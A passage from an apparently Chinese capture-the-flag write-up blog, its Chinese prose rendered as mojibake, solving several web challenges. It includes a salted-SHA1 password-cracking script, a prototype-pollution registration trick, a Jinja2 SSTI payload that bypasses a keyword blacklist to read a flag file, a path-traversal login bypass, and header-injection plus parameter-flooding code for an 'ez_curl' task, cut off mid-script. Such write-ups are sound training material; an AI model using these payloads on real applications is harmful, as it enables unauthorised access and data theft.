</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="n">PDFPage</span><span class="o">.</span><span class="n">get_pages</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">pagenos</span><span class="p">,</span> <span class="n">maxpages</span><span class="o">=</span><span class="n">maxpages</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">,</span><span class="n">caching</span><span class="o">=</span><span class="n">caching</span><span class="p">,</span> <span class="n">check_extractable</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">interpreter</span><span class="o">.</span><span class="n">process_page</span><span class="p">(</span><span class="n">page</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">retstr</span><span class="o">.</span><span class="n">getvalue</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">device</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">retstr</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">find_password</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">pdf_path</span> <span class="o">=</span> <span class="n">get_pdf</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pdf_path</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Searching word in &#34;</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">pdf_text</span> <span class="o">=</span> <span class="n">convert_pdf_to_txt</span><span class="p">(</span><span class="s2">&#34;./&#34;</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">pdf_text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">sha1_password</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">word</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;Salz!&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">sha1_password</span> <span class="o">==</span> <span class="s1">&#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Find the password :&#34;</span> <span class="o">+</span> <span class="n">word</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">find_password</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°adminçš„å¯†ç ä¸ºThinJerboa</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250123174631363.png"
	width="734"
	height="415"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250123174631363_hu2753796627976422042.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250123174631363_hu17782598199608423986.png 1024w"
	loading="lazy"
	
		alt="image-20250123174631363"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="424px"
	
></p>
<h2 id="wife_wife">wife_wife
</h2><p>å› ä¸ºä¸ä¼šåšç›´æ¥çœ‹wp</p>
<p>è¿™é¢˜è€ƒçš„æ˜¯åŸå‹é“¾æ±¡æŸ“</p>
<p>å…ˆæ³¨å†Œè´¦å·</p>
<p>æŠ“åŒ…</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124162941018.png"
	width="1489"
	height="592"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124162941018_hu9827970049933565382.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124162941018_hu1021539305789185016.png 1024w"
	loading="lazy"
	
		alt="image-20250124162941018"
	
	
		class="gallery-image" 
		data-flex-grow="251"
		data-flex-basis="603px"
	
></p>
<p>æœ‰ä¸€ä¸ªisAdminçš„å‚æ•°éœ€è¦æˆ‘ä»¬ä¼ªé€ æˆtrue</p>
<p>è¿™é‡Œå°±è¦åœ¨æ³¨å†Œçš„æ—¶å€™æ·»åŠ ä¸€ä¸ªprotoå­—å…¸</p>
<p>å°†isAdminå˜æˆtrueï¼Œå› ä¸ºisadminåŸæ¥å°±åˆ›å»ºäº†ï¼Œæ‰€ä»¥åé¢è¿™ä¸ªæ“ä½œå°±ä¼šæŠŠå‰é¢çš„å€¼ç»™æ±¡æŸ“äº†</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124163846334.png"
	width="1460"
	height="725"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124163846334_hu5018211489146481537.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124163846334_hu12739474604345764152.png 1024w"
	loading="lazy"
	
		alt="image-20250124163846334"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="483px"
	
></p>
<p>ç”±äºå‰é¢çš„æ—¶å€™ç›´æ¥æ”¹isAdminçš„å€¼æ˜¯éœ€è¦é‚€è¯·ç çš„ï¼Œæˆ‘ä»¬ä¹Ÿè¦éšä¾¿å¡«ä¸€ä¸ªé‚€è¯·ç </p>
<p>æ¥ä¸‹æ¥ç™»å…¥å°±å¾—åˆ°flag</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124164155015.png"
	width="765"
	height="524"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124164155015_hu14470317910239312636.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124164155015_hu8688121062085761409.png 1024w"
	loading="lazy"
	
		alt="image-20250124164155015"
	
	
		class="gallery-image" 
		data-flex-grow="145"
		data-flex-basis="350px"
	
></p>
<h2 id="confusion1">Confusion1
</h2><p>ç‚¹å¼€ç•Œé¢çš„login.phpå’Œregister.phpéƒ½æ²¡ä¸œè¥¿ï¼Œä½†æ˜¯æŸ¥çœ‹æºç å‘ç°flagå­˜åœ¨çš„ä½ç½®</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124171540324.png"
	width="893"
	height="125"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124171540324_hu13188427992632067401.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124171540324_hu10377066621305545180.png 1024w"
	loading="lazy"
	
		alt="image-20250124171540324"
	
	
		class="gallery-image" 
		data-flex-grow="714"
		data-flex-basis="1714px"
	
></p>
<p>ç”±äºé¢˜ç›®æè¿°å’Œå›¾ç‰‡</p>
<p>æ¨æµ‹æ˜¯pythonçš„SSTIæ³¨å…¥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124171549429.png"
	width="1504"
	height="657"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124171549429_hu2390030814885764486.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124171549429_hu14648147284119273371.png 1024w"
	loading="lazy"
	
		alt="image-20250124171549429"
	
	
		class="gallery-image" 
		data-flex-grow="228"
		data-flex-basis="549px"
	
></p>
<p>ç¡®å®å›æ˜¾äº†49ï¼Œé‚£ä¹ˆå°±æ˜¯jinja2æ¨¡æ¿çš„SSTIæ³¨å…¥</p>
<p>è¿™é‡Œå‘ç°å¥½å¤šå…³é”®è¯éƒ½è¢«è¿‡æ»¤</p>
<p>classï¼Œsubclasses,readç­‰</p>
<p>åˆ©ç”¨request.argsç»•è¿‡è¾“å…¥é»‘åå•ï¼Œè¿›è¡Œæ²™ç®±é€ƒé€¸</p>
<p>æ ¹æ®æˆ‘ä¹‹å‰çš„ç¬”è®°</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250124173214109.png"
	width="1045"
	height="141"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250124173214109_hu10813701933560700802.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250124173214109_hu9013156956733065848.png 1024w"
	loading="lazy"
	
		alt="image-20250124173214109"
	
	
		class="gallery-image" 
		data-flex-grow="741"
		data-flex-basis="1778px"
	
></p>
<p>å…ˆæ„é€ èƒ½æ‹¿åˆ°flagçš„è¯­å¥å†ç”¨request.argsæ›¿æ¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="p">[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">a</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">b</span><span class="p">][</span><span class="mi">2</span><span class="p">][</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">c</span><span class="p">]()[</span><span class="mi">40</span><span class="p">](</span><span class="s1">&#39;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;</span><span class="p">)[</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">d</span><span class="p">]()}}</span><span class="err">?</span><span class="n">a</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">b</span><span class="o">=</span><span class="vm">__mro__</span><span class="o">&amp;</span><span class="n">c</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">d</span><span class="o">=</span><span class="n">read</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¾—åˆ°flag</p>
<h2 id="ezbypass-cat">ezbypass-cat
</h2><p>è¿›æ¥ç™»å…¥ç•Œé¢ï¼Œå°è¯•sqlæ³¨å…¥æ— æœ</p>
<p>ä¸Šé¢æ˜¯login.html</p>
<p>æƒ³åˆ°loginç™½åå•</p>
<p>ç›´æ¥æ‹¼æ¥../flag.html</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125310146.png"
	width="1506"
	height="801"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125310146_hu5389296491435100883.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125125310146_hu10159687339314941224.png 1024w"
	loading="lazy"
	
		alt="image-20250125125310146"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="451px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125644363.png"
	width="1914"
	height="576"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125644363_hu2695775261578656193.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125125644363_hu5052536982706775131.png 1024w"
	loading="lazy"
	
		alt="image-20250125125644363"
	
	
		class="gallery-image" 
		data-flex-grow="332"
		data-flex-basis="797px"
	
></p>
<p>ç½‘ç«™jsè„šæœ¬é‡Œé¢æœ‰åå¤erp,åå¤erpä¸­æœ‰æ¥å£<code>user/getAllList</code>ï¼Œé€šè¿‡ç™½åå•çš„ç›®å½•ç©¿è¶Šï¼Œè®¿é—®è¯¥æ¥å£ï¼Œå¾—åˆ°ç”¨æˆ·åå’Œå¯†ç </p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125753388.png"
	width="1584"
	height="847"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125753388_hu7855387279745350948.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125125753388_hu8210229150505034628.png 1024w"
	loading="lazy"
	
		alt="image-20250125125753388"
	
	
		class="gallery-image" 
		data-flex-grow="187"
		data-flex-basis="448px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125906834.png"
	width="1574"
	height="824"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125125906834_hu17449227822188967656.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125125906834_hu2653966921441084466.png 1024w"
	loading="lazy"
	
		alt="image-20250125125906834"
	
	
		class="gallery-image" 
		data-flex-grow="191"
		data-flex-basis="458px"
	
></p>
<p>ç™»å…¥åæ‹¿cookieä¸­çš„jession idæ¥ç›®å½•æ‰«æï¼Œæ‰«åˆ°flag.html</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125130418597.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125130418597_hu9206984213303438607.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125130418597_hu1337212331514896637.png 1024w"
	loading="lazy"
	
		alt="image-20250125130418597"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250125130503206.png"
	width="1865"
	height="659"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250125130503206_hu13581192516899694976.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250125130503206_hu8518944493638560831.png 1024w"
	loading="lazy"
	
		alt="image-20250125130503206"
	
	
		class="gallery-image" 
		data-flex-grow="283"
		data-flex-basis="679px"
	
></p>
<h2 id="ez_curl">ez_curl
</h2><p>ä¸Šæ¥ä»£ç å®¡è®¡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="s1">&#39;http://back-end:3000/flag?&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$headers</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">headers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$headers</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$offset</span> <span class="o">=</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$headers</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="s1">&#39;:&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$key</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$headers</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$offset</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$value</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$headers</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span> <span class="nv">$offset</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nx">stripos</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="s1">&#39;true&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;try hard&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$params</span> <span class="o">=</span> <span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nx">json_decode</span><span class="p">(</span><span class="nv">$input</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">.=</span> <span class="nx">http_build_query</span><span class="p">(</span><span class="nv">$params</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">.=</span> <span class="s1">&#39;&amp;admin=false&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_TIMEOUT_MS</span><span class="p">,</span> <span class="mi">5000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_NOBODY</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$result</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é™„ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">admin</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;false&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">.</span><span class="nx">admin</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;true&#39;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;try hard&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">({</span> <span class="nx">port</span><span class="o">:</span> <span class="nx">port</span> <span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">});</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°expressæ¡†æ¶ï¼Œexpressçš„parameterLimité»˜è®¤ä¸º1000ï¼Œå³å‚æ•°æœ€å¤§é™åˆ¶ä¸º1000</p>
<p>è¦æ±‚adminä¼ å‚ä¸åŒ…å«&rsquo;false&rsquo;å¹¶ä¸”headersè¯·æ±‚å¤´é‡Œçš„adminå­—æ®µåŒ…å«&rsquo;true&rsquo;ï¼ŒåŸæ¥çš„phpä»£ç é‡Œé¢æ˜¯ä¼šåœ¨å‚æ•°çš„æœ€åæ‹¼æ¥&amp;admin=falseçš„ï¼Œå†™è„šæœ¬è¯·æ±‚åŠ ä¸Š1000ä¸ªå‚æ•°å°±èƒ½æˆåŠŸæŠŠæ‹¼æ¥çš„&amp;admin=flaseæŒ¤æ‰</p>
<p>phpä»£ç ä¸­è¦æ±‚headersé‡Œçš„adminå­—æ®µåŒ…å«&rsquo;true&rsquo;å°±è¡Œäº†ï¼Œå¯ä»¥æ˜¯&rsquo;xtrue&rsquo;ï¼Œè¿™é‡Œæ ¹æ®RFC 7230(HTTP/1.1åè®®çš„å®šä¹‰)çš„è§„å®šï¼Œè§„å®šäº† field-name æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæ‰“å°çš„ ASCII å­—ç¬¦ç»„æˆï¼Œä¸åŒ…æ‹¬åˆ†éš”ç¬¦ï¼ŒåŒ…æ‹¬ç©ºæ ¼ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ª field-name çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ç©ºæ ¼ï¼Œé‚£ä¹ˆè¿™ä¸ª HTTP header æ˜¯éæ³•çš„ï¼Œåº”è¯¥è¢«æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯å¿½ç•¥æˆ–æ‹’ç»ï¼Œç„¶è€Œï¼ŒNode.js åœ¨å¤„ç†è¿™ç±»æƒ…å†µæ—¶é€šå¸¸æ˜¯å®½å®¹çš„ã€‚</p>
<p>ä¼ å…¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;headers&#34;: [&#34;admin: x&#34;, &#34; true: y&#34;]}
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ€åheaderè¢«nodejsè§£æåå˜æˆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  &#34;admin&#34;: &#34;x true y&#34;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºtrueçš„å‰é¢å¤šäº†ä¸ªç©ºæ ¼ï¼Œæ‰€ä»¥æ‰ä¼šè¢«è§£ææˆè¿™æ ·</p>
<p>è¿™æ ·adminå­—æ®µåŒ…å«â€˜trueâ€™ï¼Œæ»¡è¶³æ¡ä»¶ã€‚</p>
<p>æˆ–è€…æ˜¯è¿™æ ·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;headers&#34;: [&#34;xx:xx\nadmin: true&#34;]}
</span></span></code></pre></td></tr></table>
</div>
</div><p>å› ä¸ºå‰é¢çš„striposå‡½æ•°ä¼šæŸ¥æ‰¾ç¬¬ä¸€ä¸ªå†’å·å‡ºç°çš„ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>admin</code>å’Œ<code>true</code>å­—ç¬¦ä¸²éƒ½åœ¨ç¬¬ä¸€ä¸ªå†’å·åé¢ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡PHPä»£ç çš„æ£€æµ‹ï¼Œè€Œåœ¨NodeJSè§£ææ—¶ï¼Œä¼šè§£æå¾—åˆ°<code>admin</code>çš„å­—æ®µä¸ºtrue.</p>
<p>è„šæœ¬</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">datas</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;headers&#34;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&#34;xx:xx</span><span class="se">\n</span><span class="s2">admin: true&#34;</span><span class="p">],</span>        
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;params&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;admin&#34;</span><span class="p">:</span> <span class="s2">&#34;true&#34;</span><span class="p">}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1020</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">datas</span><span class="p">[</span><span class="s2">&#34;params&#34;</span><span class="p">][</span><span class="s2">&#34;x&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span> <span class="o">=</span> <span class="n">i</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">json1</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">datas</span><span class="p">)</span>
